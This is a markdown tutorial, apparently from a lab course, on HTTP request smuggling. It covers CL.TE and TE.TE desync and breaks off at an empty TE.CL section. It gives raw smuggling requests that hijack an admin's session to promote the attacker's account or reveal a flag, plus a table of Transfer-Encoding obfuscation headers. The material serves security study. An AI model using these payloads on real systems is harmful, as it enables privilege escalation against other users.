# HTTP Request Smuggling/Desync Attacks
- [Overview](#overview)
    - [TCP Stream of HTTP requests](#tcp-stream-of-http-requests)
    - [Content-Length vs Transfer-Encoding](#content-length-vs-transfer-encoding)
    - [Desynchronization](#desynchronization)
- [CL.TE](#clte)
    - [Identification](#identification)
    - [Exploitation](#exploitation)
- [TE.TE](#tete)
    - [Identification](#identification-1)
    - [Exploitation](#exploitation-1)
- [TE.CL](#tecl)
    - []


## Overview
- HTTP Request Smuggling or sometimes also called Desync Attacks is an advanced attack vector that exploits a discrepancy between a frontend and a backend system in the parsing of incoming HTTP requests. 

- The frontend system can be any intermediary system such as a reverse proxy, web cache, or web application firewall (WAF), while the backend system is typically the web server.

### TCP Stream of HTTP requests
- The Transmission Control Protocol (TCP) is a transport layer protocol that provides reliable and ordered communication. In particular, TCP is a stream-oriented protocol, meaning it transmits streams of data. 
- The application layer protocol (which can be HTTP for instance) does not know how many TCP packets were transmitted, it just receives the raw data from TCP.

- HTTP requests and responses are transmitted using TCP. In HTTP/1.0, each HTTP request was sent over a separate TCP socket.
- However, since HTTP/1.1, requests are typically not transmitted over separate TCP connections but the same TCP connection is used to transmit multiple request-response pairs. This allows for better performance since the establishment of TCP connections takes time. If a new HTTP request required a new TCP connection, the overhead would be much higher.
- In particular, in settings where a reverse proxy sits in front of the actual web server and all requests are transmitted from the reverse proxy to the web server, the TCP socket is usually kept open and re-used for all requests: ![smuggling1](/images/diagram_reqsmuggling1.jpg)

- Since TCP is stream-oriented, multiple HTTP requests are sent subsequently in the same TCP stream. The TCP stream contains all HTTP requests back-to-back as there is no separator between the requests. Consider the following simplified representation of a TCP stream containing two HTTP requests: 
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 5

HELLOGET / HTTP/1.1
Host: clte.htb
```
- The POST request contains a request body consisting of the word `HELLO`. The subsequent GET request starts immediately after the POST request's body ends, there is no delimiter. 
- Thus, to parse the HTTP requests correctly, both the reverse proxy and web server need to know where the current request ends and where the next request starts. In other words, both systems need to know where the request boundaries are within the TCP stream.

### Content-Length vs Transfer-Encoding
- Content-Length (CL) and Transfer-Encoding (TE) headers are used to determine how long an HTTP request's body is.
#### Content-Length
- The CL header is most commonly used and you have probably seen it before. It simply specifies the byte length of the message body in the Content-Length HTTP header. An example request:
```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

param1=HelloWorld&param2=Test
```
- The CL header specifies a length of 29 bytes. Therefore, all systems know that this HTTP request contains a request body that is exactly 29 bytes long.

#### Transfer-Encoding
- On the other hand, the TE header can be used to specify a chunked encoding, indicating that the request contains multiple chunks of data. Let's look at the same request with chunked encoding:

```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

1d
param1=HelloWorld&param2=Test
0


```
- We can see that the HTTP header Transfer-Encoding specifies a chunked encoding. The body now consists of chunks of data. 
- Each chunk is preceded by the chunk size in hex on a separate line, followed by the payload of the chunk. The request is terminated by a chunk of size 0. As we can see, the request contains a chunk of size `0x1d` which is equal to 29 in decimal followed by the same payload as the previous request. Afterward, the request is terminated by the empty chunk.

> [!NOTE]
> The chunks sizes and chunks are separated by the CRLF control sequence. If we display the CRLF characters, the request body looks like this:
> `1d\r\nparam1=HelloWorld&param2=Test\r\n0\r\n\r\n`

> [!IMPORTANT]
> - If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.
> - So, if a request contains both a CL and TE header, the TE header has precedence and the CL header should be ignored.

### Desynchronization
- Request smuggling attacks exploit discrepancies between the reverse proxy and web server.
- In particular, the attack forces a disagreement in the request boundaries between the two systems, thus causing a desynchronization which is why request smuggling attacks are sometimes also called Desync Attacks.

- What normally happens
    - When you browse a website, your browser sends HTTP requests to a web server.
    - These requests are independent. Your request should never affect someone else’s request.
    - This isolation is critical because many users share the same server.

- What changes with desynchronization
    - HTTP traffic often goes through multiple systems, like a reverse proxy (load balancer) and the web server itself.
    - These systems both need to agree on where one request ends and the next begins.
    - Sometimes, they disagree about the boundaries (where a request ends).

- How the disagreement happens
    - Requests are sent over the same TCP connection, not separate ones.
    - If the proxy thinks the request ends at one point but the server thinks it ends later, then some leftover data sits in the connection.
    - This leftover data can be seen differently:
        - Proxy: "This belongs to the next request."
        - Server: "This is still part of the previous request."
![smuggling](/images/diagram_reqsmuggling2.jpg)

## CL.TE
- If a request contains both the CL and TE headers, the reverse proxy will (incorrectly) use the CL header to determine the request length, while the web server will (correctly) use the TE header to determine the request length. 
- As such, this type of HTTP request smuggling vulnerability is called CL.TE vulnerability.

- Example, consider a request like the following:
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```
- Now let's look at the complete TCP stream containing both these subsequent requests:
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLOGET / HTTP/1.1
Host: clte.htb
```
- According to the reverse proxy, the TCP stream should be split at the point where the word 'HELLO' appears.
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```
```http
GET / HTTP/1.1
Host: clte.htb
```
- We can see that the first request's body ends after HELLO and the subsequent request starts with the GET keyword. Now let's look at it from the perspective of the web server:
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0
```
```http
HELLOGET / HTTP/1.1
Host: clte.htb
```
- Since the web server thinks the first request ends after the bytes `0\r\n\r\n`, the bytes HELLO are prepended to the subsequent request such that the request method was changed from GET to HELLOGET. 
- Since that is an invalid HTTP method, the web server will most likely respond with an `HTTP 405 - Method not allowed` error message even though the second request by itself uses a valid HTTP method.

- In this example scenario, we successfully created a desynchronization between the reverse proxy and web server to influence the request method of the subsequent request. 
- Since all requests share the same TCP connection between the reverse proxy and web server, the second request does not need to come from the same source as the first request. Therefore, this attack allows an attacker to influence requests by other users without their knowledge.

### Identification
- To do so, we can use the two requests shown above. 
- Copy the requests to two separate tabs in Burp Repeater. Quickly send the two requests after each other to observe the behavior described above. The first response contains the index of the web application:
![clte2](/images/clte_2.jpg)
- If we now send the second request immediately afterward, we can observe that the web server responds with the HTTP 405 status code for the reasons discussed above:
![clte3](/images/clte_3.jpg)
- Thus, we successfully confirmed that the setup is vulnerable to a CL.TE request smuggling vulnerability since we influenced the second request with the first one.

### Exploitation
- Let's assume we want to force the admin user to promote our low-privilege user account to an admin user which can be done with the endpoint `/admin.php?promote_uid=2` where our user id is 2. We can force the admin user to do so by sending the following request:
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
```
- If we wait for the admin user to access the page, our user has been promoted. So let's investigate what exactly happened.
- The admin user accesses the page using his session cookie with a request like this:
```http
GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
- This request is benign. The admin user simply accesses the index of the website, so no action should be taken. Let's look at the TCP stream from the reverse proxy's view:
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
```
```http
GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
- The reverse proxy uses the CL header to determine the length of the first request such that it ends just after `Dummy: `. The reverse proxy sees a POST request to / by us and a GET request to / by the admin user.

- Now let's look at the TCP stream from the web server's view:
```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0


```
```http
POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
- Since the web server correctly uses the chunked encoding, it determines that the first request ends with the empty chunk. 
- The web server thus sees a POST request to / by us and a POST request to `/admin.php?promote_uid=2` by the admin user. 
- Since the admin user's request is authenticated and the session cookie sent along the request, we successfully forced the admin user to grant our user admin rights without the admin user even knowing what happened.

> [!NOTE]
> We need to add a separate line with the Dummy keyword to our first request to "hide" the first line of the admin user's request as an HTTP header value to preserve the syntax of the request's header section.

## TE.TE
- The next example of HTTP request smuggling deals with a setting where both the reverse proxy and web server support chunked encoding.
- However one of the two systems does not act according to the specification such that it is possible to manipulate the TE header in such a way that one of the two systems accepts it and the other one does not, instead falling back to the CL header.

- Thus, it is possible to obfuscate the TE header such that one of the two systems does not parse it correctly.
### Identification
- To identify a TE.TE request smuggling vulnerability, we need to trick either the reverse proxy or the web server into ignoring the TE header. 
- We can do this by slightly deviating from the specification to check whether the implementation of the two systems follows the specification accurately.
- For instance, some systems might only check for the presence of the keyword chunked in the TE header, while other systems check for an exact match.
- In such cases, it is sufficient to set the TE header to testchunked to trick one of the two systems to ignore the TE header and fall back to the CL header instead.
- Here are a few options we could try to obfuscate the TE header from one of the two systems:

| Description             | Header                             |
|--------------------------|------------------------------------|
| Substring match          | `Transfer-Encoding: testchunked`     |
| Space in Header name     | `Transfer-Encoding : chunked`        |
| Horizontal Tab Separator | `Transfer-Encoding:[\x09]chunked`    |
| Vertical Tab Separator   | `Transfer-Encoding:[\x0b]chunked`    |
| Leading space            |  `Transfer-Encoding: chunked`        |

> [!NOTE]
> The sequences [\x09] and [\x0b] are not the literal character sequences used in the obfuscation. Rather they denote the horizontal tab character (ASCII 0x09) and vertical tab character (ASCII 0x0b).

- As an example, let's assume a scenario where we can trick the reverse proxy into ignoring the TE header with the Horizontal Tab method, while the web server parses it despite the tab.
- Since the reverse proxy falls back to the CL header, the identification and exploitation would then be the same as in a CL.TE scenario.

- Let's copy the following request to a Burp Repeater tab:
```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```
- Now let's replace the space that separates the TE header from the chunked value with a horizontal tab. We can do so by switching to the Hex view in the Repeater Tab and directly editing the space (0x20) to a horizontal tab (0x09):
![tete](/images/tete_1.jpg)

- When we now send the following request twice in quick succession, the second response should result in an HTTP 405 status code. We explored the reason for that in the previous section:
![tete2](/images/tete_2.jpg)

- We successfully obfuscated the TE header from the reverse proxy, effectively leading to a CL.TE scenario.
### Exploitation
- Since the setting is effectively equivalent to a CL.TE request smuggling scenario, the exploitation of our example is the same as discussed in the previous section. 
- We just need to obfuscate the TE header in our request using the horizontal tab method to force the reverse proxy to fall back to the CL header.

- We can use the following request to force the admin user to reveal the flag for us:
```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 46
Transfer-Encoding:	chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
Dummy:
```
> [!NOTE]
> Generally, it is important to keep in mind that request smuggling vulnerabilities might be time-sensitive. There may be multiple worker threads or connection pools which may make exploitation of request smuggling vulnerabilities more challenging. Therefore, we often have to send our request multiple times. Particularly when targeting other users, we often need to get the timing.

## TE.CL
- We will look at a setup where the reverse proxy parses the TE header and the web server uses the CL header to determine the request length. This is called a TE.CL request smuggling vulnerability.

### Foundation
